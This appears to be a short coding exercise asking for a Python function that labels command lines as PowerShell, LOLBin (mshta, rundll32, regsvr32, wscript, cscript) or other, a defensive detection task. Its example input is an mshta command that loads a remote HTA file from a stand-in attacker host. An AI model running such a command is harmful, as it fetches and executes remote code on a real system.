2. Command-line classifier
Write:
def classify_command(command):
Return:
"powershell"
if the command contains powershell
"lolbin"
if it contains any of:
mshta
rundll32
regsvr32
wscript
cscript
Otherwise:
"other"
Requirements:
- Case-insensitive
- Ignore surrounding whitespace
- If both PowerShell and a LOLBin appear, return "powershell"
Example:
classify_command("  MSHTA http://evil.test/a.hta ")
# "lolbin"